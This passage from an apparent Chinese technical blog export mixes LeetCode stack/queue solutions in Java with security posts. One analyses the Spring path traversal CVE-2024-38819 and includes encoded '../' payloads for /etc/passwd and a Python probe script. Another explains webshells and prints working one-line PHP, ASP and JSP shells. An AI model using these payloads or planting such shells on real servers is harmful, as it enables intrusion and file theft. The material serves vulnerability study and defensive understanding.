<span class="variable">len</span> <span class="operator">=</span> nums.length - k + <span class="number">1</span>;</span><br><span class="line">        <span class="comment">// 存放结果元素的数组</span></span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[len];</span><br><span class="line">        <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 自定义队列</span></span><br><span class="line">        <span class="type">MyQueue</span> <span class="variable">myQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyQueue</span>();</span><br><span class="line">        <span class="comment">// 先将前k元素放入队列</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; k; i++)&#123;</span><br><span class="line">            myQueue.add(nums[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        res[num++] = myQueue.peek();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> k; i &lt; nums.length; i++)&#123;</span><br><span class="line">            <span class="comment">// 滑动窗口移除最前面的元素，移除时判断该元素是否放入队列</span></span><br><span class="line">            myQueue.poll(nums[i - k]);</span><br><span class="line">            <span class="comment">// 滑动窗口加入最后面的元素</span></span><br><span class="line">            myQueue.add(nums[i]);</span><br><span class="line">            <span class="comment">// 记录最大值</span></span><br><span class="line">            res[num++] = myQueue.peek();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 解法二，利用双端队列手动实现单调队列</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 用一个单调队列来存储对应的下标，每当窗口滑动的时候，直接取队列的头部指针对应的值放入结果集即可</span></span><br><span class="line"><span class="comment"> * 单调队列类似 （tail --&gt;） 3 --&gt; 2 --&gt; 1 --&gt; 0 (--&gt; head) (右边为头结点，元素存的是下标)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] maxSlidingWindow(<span class="type">int</span>[] nums, <span class="type">int</span> k) &#123;</span><br><span class="line">        ArrayDeque&lt;Integer&gt; deque = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[n - k + <span class="number">1</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">idx</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">            <span class="comment">// 根据题意，i为nums下标，是要在[i - k + 1, i] 中选到最大值，只需要保证两点</span></span><br><span class="line">            <span class="comment">// 1.队列头结点需要在[i - k + 1, i]范围内，不符合则要弹出</span></span><br><span class="line">            <span class="keyword">while</span>(!deque.isEmpty() &amp;&amp; deque.peek() &lt; i - k + <span class="number">1</span>)&#123;</span><br><span class="line">                deque.poll();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 2.既然时单调，就要保证每次放进去的数字都要比末尾的大，否则也弹出</span></span><br><span class="line">            <span class="keyword">while</span>(!deque.isEmpty() &amp;&amp; nums[deque.peekLast()] &lt; nums[i])&#123;</span><br><span class="line">                deque.pollLast();</span><br><span class="line">            &#125;</span><br><span class="line">            deque.offer(i);</span><br><span class="line">            <span class="comment">// 因为单调，当i增长到符合第一个k范围的时候，每滑动一步都将队列头节点放入结果就行了</span></span><br><span class="line">            <span class="keyword">if</span>(i &gt;= k - <span class="number">1</span>)&#123;</span><br><span class="line">                res[idx++] = nums[deque.peek()];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="347-前-K-个高频元素"><a href="#347-前-K-个高频元素" class="headerlink" title="347.前 K 个高频元素"></a>347.前 K 个高频元素</h2><p>给定一个非空的整数数组，返回其中出现频率前 k 高的元素。</p><p>示例 1:<br>输入: nums &#x3D; [1,1,1,2,2,3], k &#x3D; 2<br>输出: [1,2]</p><p>示例 2:<br>输入: nums &#x3D; [1], k &#x3D; 1<br>输出: [1]</p><p>提示：<br>你可以假设给定的 k 总是合理的，且 1 ≤ k ≤ 数组中不相同的元素的个数。<br>你的算法的时间复杂度必须优于 $O(n \log n)$ , n 是数组的大小。<br>题目数据保证答案唯一，换句话说，数组中前 k 个高频元素的集合是唯一的。<br>你可以按任意顺序返回答案。</p><h3 id="题解-3"><a href="#题解-3" class="headerlink" title="题解"></a>题解</h3><p>首先统计元素出现的频率，这一类的问题可以使用map来进行统计。</p><p>然后是对频率进行排序，这里我们可以使用一种 容器适配器就是优先级队列。</p><p>什么是<strong>优先级队列</strong>呢？<br>其实就是一个披着队列外衣的堆，因为优先级队列对外接口只是从队头取元素，从队尾添加元素，再无其他取元素的方式，看起来就是一个队列。<br>而且优先级队列内部元素是自动依照元素的权值排列。那么它是如何有序排列的呢？<br>缺省情况下priority_queue利用max-heap（大顶堆）完成对元素的排序，这个大顶堆是以vector为表现形式的complete binary tree（完全二叉树）。</p><p>什么是堆呢？<br>堆是一棵完全二叉树，树中每个结点的值都不小于（或不大于）其左右孩子的值。 如果父亲结点是大于等于左右孩子就是大顶堆，小于等于左右孩子就是小顶堆。<br>所以大家经常说的大顶堆（堆头是最大元素），小顶堆（堆头是最小元素），如果懒得自己实现的话，就直接用priority_queue（优先级队列）就可以了，底层实现都是一样的，从小到大排就是小顶堆，从大到小排就是大顶堆。</p><p>本题我们就要使用优先级队列来对部分频率进行排序。<br>为什么不用快排呢， 使用快排要将map转换为vector的结构，然后对整个数组进行排序， 而这种场景下，我们其实只需要维护k个有序的序列就可以了，所以使用优先级队列是最优的。</p><p>此时要思考一下，是使用小顶堆呢，还是大顶堆？<br>有的同学一想，题目要求前 K 个高频元素，那么果断用大顶堆啊。<br>那么问题来了，定义一个大小为k的大顶堆，在每次移动更新大顶堆的时候，每次弹出都把最大的元素弹出去了，那么怎么保留下来前K个高频元素呢。<br>而且使用大顶堆就要把所有元素都进行排序，那能不能只排序k个元素呢？<br>所以我们要用小顶堆，因为要统计最大前k个元素，只有小顶堆每次将最小的元素弹出，最后小顶堆里积累的才是前k个最大元素。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 大顶堆解法</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] topKFrequent(<span class="type">int</span>[] nums, <span class="type">int</span> k) &#123;</span><br><span class="line">        Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> num : nums)&#123;</span><br><span class="line">            map.put(num, map.getOrDefault(num, <span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//在优先队列中存储二元组(num, cnt),cnt表示元素值num在数组中的出现次数</span></span><br><span class="line">        <span class="comment">//出现次数按从队头到队尾的顺序是从大到小排,出现次数最多的在队头(相当于大顶堆)</span></span><br><span class="line">        PriorityQueue&lt;<span class="type">int</span>[]&gt; pq = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;((pair1, pair2) -&gt; pair2[<span class="number">1</span>] - pair1[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">for</span>(Map.Entry&lt;Integer, Integer&gt; entry : map.entrySet())&#123;<span class="comment">// 大顶堆需要对所有元素进行排序</span></span><br><span class="line">            pq.add(<span class="keyword">new</span> <span class="title class_">int</span>[]&#123;entry.getKey(), entry.getValue()&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span>[] ans = <span class="keyword">new</span> <span class="title class_">int</span>[k];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; k; i++)&#123; <span class="comment">//依次从队头弹出k个就是频率前k高的</span></span><br><span class="line">            ans[i] = pq.poll()[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 小顶堆解法</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] topKFrequent(<span class="type">int</span>[] nums, <span class="type">int</span> k) &#123;</span><br><span class="line">        Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> num : nums)&#123;</span><br><span class="line">            map.put(num, map.getOrDefault(num, <span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//在优先队列中存储二元组(num, cnt),cnt表示元素值num在数组中的出现次数</span></span><br><span class="line">        <span class="comment">//出现次数按从队头到队尾的顺序是从大到小排,出现次数最多的在队头(相当于大顶堆)</span></span><br><span class="line">        PriorityQueue&lt;<span class="type">int</span>[]&gt; pq = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;((pair1, pair2) -&gt; pair1[<span class="number">1</span>] - pair2[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">for</span>(Map.Entry&lt;Integer, Integer&gt; entry : map.entrySet())&#123;<span class="comment">//小顶堆只需要维持k个</span></span><br><span class="line">            <span class="keyword">if</span>(pq.size() &lt; k)&#123;</span><br><span class="line">                pq.add(<span class="keyword">new</span> <span class="title class_">int</span>[]&#123;entry.getKey(), entry.getValue()&#125;);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(entry.getValue() &gt; pq.peek()[<span class="number">1</span>])&#123; <span class="comment">//当前元素出现次数大于小顶堆的根结点(这k个元素中出现次数最少的那个)</span></span><br><span class="line">                    pq.poll(); <span class="comment">//弹出队头(小顶堆的根结点),即把堆里出现次数最少的那个删除,留下的就是出现次数多的了</span></span><br><span class="line">                    pq.add(<span class="keyword">new</span> <span class="title class_">int</span>[]&#123;entry.getKey, entry.getValue&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span>[] ans = <span class="keyword">new</span> <span class="title class_">int</span>[k];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> k-<span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)&#123; <span class="comment">//依次弹出小顶堆,先弹出的是堆的根,出现次数少,后面弹出的出现次数多</span></span><br><span class="line">            ans[i] = pq.poll()[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>栈里面的元素在内存中是连续分布的么？</p><p>这个问题有两个陷阱：<br>陷阱1：栈是容器适配器，底层容器使用不同的容器，导致栈内数据在内存中不一定是连续分布的。<br>陷阱2：缺省情况下，默认底层容器是deque，那么deque在内存中的数据分布是什么样的呢？ 答案是：不连续的，下文也会提到deque。</p><p>一个队列在模拟栈弹出元素的时候只要将队列头部的元素（除了最后一个元素外） 重新添加到队列尾部，此时在去弹出元素就是栈的顺序了。</p><h3 id="栈在系统中的应用"><a href="#栈在系统中的应用" class="headerlink" title="栈在系统中的应用"></a>栈在系统中的应用</h3><p>如果还记得编译原理的话，编译器在词法分析的过程中处理括号、花括号等这个符号的逻辑，就是使用了栈这种数据结构。</p><p>再举个例子，linux系统中，cd这个进入目录的命令我们应该再熟悉不过了。<code>cd a/b/c/../../</code><br>这个命令最后进入a目录，系统是如何知道进入了a目录呢 ，这就是栈的应用。</p><p>递归的实现是栈：每一次递归调用都会把函数的局部变量、参数值和返回地址等压入调用栈中，然后递归返回的时候，从栈顶弹出上一次递归的各项参数，所以这就是递归为什么可以返回上一层位置的原因。</p>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 栈 </tag>
            
            <tag> 队列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CVE分析】2024年10月份</title>
      <link href="/2024/10/18/WebSecurity/cve/20241018/"/>
      <url>/2024/10/18/WebSecurity/cve/20241018/</url>
      
        <content type="html"><![CDATA[<p>2024年12月16日，放出来了poc：<a href="https://mp.weixin.qq.com/s/g64YdLFa_o3GZDic9WfkIQ">https://mp.weixin.qq.com/s/g64YdLFa_o3GZDic9WfkIQ</a></p><h2 id="CVE-2024-38819"><a href="#CVE-2024-38819" class="headerlink" title="CVE-2024-38819"></a>CVE-2024-38819</h2><p><a href="https://spring.io/security/cve-2024-38819">https://spring.io/security/cve-2024-38819</a><br>通过功能性 Web 框架 WebMvc.fn 或 WebFlux.fn 提供静态资源的应用程序容易受到路径遍历攻击。攻击者可以构建恶意 HTTP 请求，并获取文件系统上任何文件，这些文件也可以被运行 Spring 应用程序的进程访问。<br>这与 CVE-2024-38816 类似，但输入不同。</p><p>Affected Spring Products and Versions<br>Spring Framework:<br>5.3.0 - 5.3.40<br>6.0.0 - 6.0.24<br>6.1.0 - 6.1.13<br>Older, unsupported versions are also affected</p><p>看到6.1.x版本存在漏洞，而6.1.14版本不存在，我下载了13和14两个版本的代码，想要通过对比查看这个漏洞点在哪里<br>使用<strong>WinMerge</strong>对比代码发现在，webmvc目录下的代码存在如下差异：<br><img src="/2024/10/18/WebSecurity/cve/20241018/image.png"></p><p>来看下变更的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 13版本</span></span><br><span class="line"><span class="keyword">protected</span> String <span class="title function_">processPath</span><span class="params">(String path)</span> &#123;</span><br><span class="line">path = StringUtils.replace(path, <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">path = cleanDuplicateSlashes(path);</span><br><span class="line"><span class="keyword">return</span> cleanLeadingSlash(path);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 14版本</span></span><br><span class="line"><span class="keyword">protected</span> String <span class="title function_">processPath</span><span class="params">(String path)</span> &#123;</span><br><span class="line">path = StringUtils.replace(path, <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">path = cleanDuplicateSlashes(path);</span><br><span class="line">path = cleanLeadingSlash(path);</span><br><span class="line"><span class="keyword">return</span> normalizePath(path);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">normalizePath</span><span class="params">(String path)</span> &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> path;</span><br><span class="line"><span class="keyword">if</span> (result.contains(<span class="string">&quot;%&quot;</span>)) &#123;</span><br><span class="line">result = decode(result);</span><br><span class="line"><span class="keyword">if</span> (result.contains(<span class="string">&quot;%&quot;</span>)) &#123;</span><br><span class="line">result = decode(result);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (result.contains(<span class="string">&quot;../&quot;</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> StringUtils.cleanPath(result);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> path;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">decode</span><span class="params">(String path)</span> &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">return</span> URLDecoder.decode(path, StandardCharsets.UTF_8);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到主要是添加了上面的两个函数<code>normalizePath decode</code></p><ol><li><p><strong>路径规范化（<code>normalizePath</code> 方法的添加）</strong>：</p><ul><li>新代码中添加了<code>normalizePath</code>方法，这个方法更详尽地处理了路径中的编码问题。如果路径包含百分号（<code>%</code>），该方法将尝试解码路径，并在解码后再次验证路径是否含有<code>../</code>，如果有，则调用<code>StringUtils.cleanPath</code>来规范化路径。这增加了对路径编码漏洞的防护，可以防止攻击者利用编码后的特殊字符（如<code>%2e%2e%2f</code>对应<code>../</code>）进行攻击。</li></ul></li><li><p><strong>路径解码逻辑（<code>decode</code> 方法的实现）</strong>：</p><ul><li>新增的<code>decode</code>方法尝试解码路径，如果解码失败，则返回空字符串。这样的处理减少了因解码失败导致的异常抛出，增强了代码的健壮性，并间接防止了可能的攻击。</li></ul></li><li><p><strong>更严格的路径验证（改进<code>isInvalidPath</code> 和 <code>isInvalidEncodedInputPath</code> 方法）</strong>：</p><ul><li><code>isInvalidPath</code>方法现在直接返回<code>true</code>如果路径中包含<code>&quot;../&quot;</code>，这简化了检查逻辑，确保了路径中不包含向上级目录的跳转。</li><li><code>isInvalidEncodedInputPath</code>方法对于包含百分号的路径，会在解码后对路径进行两次检查，一次是直接解码后，另一次是处理（正规化）解码后的路径。这样的双重检查可以更有效地捕捉到潜在的非法路径访问尝试。<br><img src="/2024/10/18/WebSecurity/cve/20241018/image-1.png"><br>下面分析利用链<br><img src="/2024/10/18/WebSecurity/cve/20241018/image-2.png"><br>通过test可以看到是类似这样的资源访问会触发，接下来尝试构造poc</li></ul></li><li><p><strong>构建请求</strong>：</p><ul><li>尝试通过多重编码的路径来绕过可能的单层路径过滤。</li><li>示例路径：<code>http://example.com/resources/../../../../../../../../../etc/passwd</code></li><li>使用编码避免过滤：<code>http://example.com/resources/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</code></li><li>更多编码层次：<code>http://example.com/resources/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd</code></li></ul></li><li><p><strong>构建测试脚本</strong>（使用Python）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_path_traversal</span>(<span class="params">url_base</span>):</span><br><span class="line">    <span class="comment"># 不同层次的编码测试</span></span><br><span class="line">    paths = [</span><br><span class="line">        <span class="string">&quot;/../../../../../../../../../etc/passwd&quot;</span>,  <span class="comment"># 无编码</span></span><br><span class="line">        <span class="string">&quot;/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd&quot;</span>,  <span class="comment"># 单次编码</span></span><br><span class="line">        <span class="string">&quot;/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd&quot;</span>  <span class="comment"># 多次编码</span></span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">for</span> path <span class="keyword">in</span> paths:</span><br><span class="line">        full_url = <span class="string">f&quot;<span class="subst">&#123;url_base&#125;</span><span class="subst">&#123;path&#125;</span>&quot;</span></span><br><span class="line">        response = requests.get(full_url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;root:&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Vulnerable to path traversal at <span class="subst">&#123;full_url&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Secure against path traversal at <span class="subst">&#123;full_url&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    test_path_traversal(<span class="string">&quot;http://example.com/resources&quot;</span>)</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Web安全】webshell免杀绕过waf等</title>
      <link href="/2024/10/18/WebSecurity/webshell/webshellevasion/"/>
      <url>/2024/10/18/WebSecurity/webshell/webshellevasion/</url>
      
        <content type="html"><![CDATA[<p>aes经常会遇到斜杠，base64没有</p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Webshell </tag>
            
            <tag> 免杀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Web安全】深入理解Webshell：部署、检测与防御</title>
      <link href="/2024/10/18/WebSecurity/webshell/webshell/"/>
      <url>/2024/10/18/WebSecurity/webshell/webshell/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.freebuf.com/articles/network/307685.html">https://www.freebuf.com/articles/network/307685.html</a><br>一文讲解webshell <a href="https://cloud.tencent.com/developer/article/1635250">https://cloud.tencent.com/developer/article/1635250</a></p><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>Webshell就是以asp、php、jsp或cgi等网页文件形式存在的一种代码执行环境，也可以将其称做为一种网页后门。</p><p>WebShell的特点</p><ol><li>持久化远程访问: Webshell脚本通常会包含后门，黑客上传Webshell之后，就可以充分利用Webshell的后门实现远程访问并控制服务器，从而达到长期控制网站服务器的目的。此外，在上传完Webshell之后，黑客会选择自己修复漏洞，以确保没有其他人会利用该漏洞。通过这种方式，黑客就可以一种低调的姿态，避免与管理员进行任何交互，同时仍然获得相同的结果。</li><li>提权: 在服务器没有配置错误的情况下，Webshell将在web服务器的用户权限下运行，而用户权限是有限的。通过Webshell，黑客可以利用系统上的本地漏洞来实现权限提升，从而获得Root权限，这样黑客基本上可以在系统上做任何事情，包括安装软件、更改权限、添加和删除用户、窃取密码、阅读电子邮件等等。</li><li>隐蔽性极强: Webshell可以嵌套在正常网页中运行，且不容易被查杀。它还可以穿越服务器防火墙，由于与被控制的服务器或远程主机交互的数据都是通过80端口传递，因此不会被防火墙拦截，在没有记录流量的情况下，Webshell使用post包发送，也不会被记录在系统日志中，只会在Web日志中记录一些数据提交的记录。</li></ol><p><strong>WebShell分类</strong><br>Webshell根据脚本可以分为PHP脚本木马，ASP脚本木马，JSP脚本木马，也有基于.NET的脚本木马。根据时代和技术的变迁，也有用python和lua编写的脚本木马，常用有如下几种：</p><ul><li>大马：体积大，功能全；会调用系统关键函数；以代码加密进行隐藏</li><li>小马：体积小，功能少；一般只有一个上传功能，用于上传大马</li><li>一句话木马：代码短；使用场景大，可单独生成文件，可插入文件；安全性高，隐藏性强，可变形免杀；框架不变，数据执行，数据传递；使用客户端管理webshell，省去使用命令行以及各种参数配置，可以使用中国蚁剑图形化操作webshell</li><li>打包马：主要用于打包网站源码</li><li>拖库马：主要用于导出网站数据库</li><li>内存马：无文件落地；极难检测和发现；难以清除</li></ul><p><strong>WebShell原理</strong><br>不同脚本类型的一句话木马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="keyword">eval</span> <span class="title function_ invoke__">request</span>(<span class="string">&quot;cmd&quot;</span>)%&gt;</span><br><span class="line">&lt;%@ Page Language=<span class="string">&quot;Jscript&quot;</span>%&gt;&lt;%<span class="keyword">eval</span>(Request.Item[<span class="string">&quot;cmd&quot;</span>],<span class="string">&quot;unsafe&quot;</span>);%&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br><span class="line">&lt;%Runtime.<span class="title function_ invoke__">getRuntime</span>().<span class="title function_ invoke__">exec</span>(request.<span class="title function_ invoke__">getParameter</span>(<span class="string">&quot;cmd&quot;</span>));%&gt;</span><br></pre></td></tr></table></figure><p><img src="/2024/10/18/WebSecurity/webshell/webshell/image.png"></p><p>PHP一句话木马核心步骤如下：</p><ol><li>数据传递: <code>$_GET、$_POST、$_COOKIES、$_REQUEST、$_FILE、$_SERVER</code><br>  从远程远程URL中获取数据: file_get_contents、curl、svn_checkout…<br>  （将需要执行的指令数据放在远程URL中，通过URL_INCLUDE来读取）<br>  从本地磁盘文件中获取数据: file、file_get_contents…<br>  （将需要执行的指令数据放在本地磁盘文件中，利用IO函数来读取）<br>  从数据库中读取（将需要执行的指令放在数据库中，利用数据库函数来读取）<br>  从图片头部中获取: exif_read_data…（将需要执行的指令数据放在图片头部中，利用图片操作函数来读取）</li><li>代码执行<br>  代码执行函数：eval、assert、system…执行（这是最普通、标准的代码执行）<br>  LFI（本地文件包含）：include、require…（利用浏览器的伪协议将文件包含转化为代码执行）<br>  动态函数执行：（$()…PHP的动态函数特性）<br>  Curly Syntax：（${${…}}…它将执行花括号间的代码，并将结果替换回去。这种思路可以把变量赋值的漏洞转化为代码执行的机会）</li></ol><p><strong>PHP中常被利用的函数</strong><br>    1. 简单的PHP Webshell 使用 <code>system()</code> 函数<br>    <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>    2. 使用 <code>exec()</code> 函数的Webshell</p><pre><code><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>], <span class="variable">$output</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$output</span> <span class="keyword">as</span> <span class="variable">$line</span>) 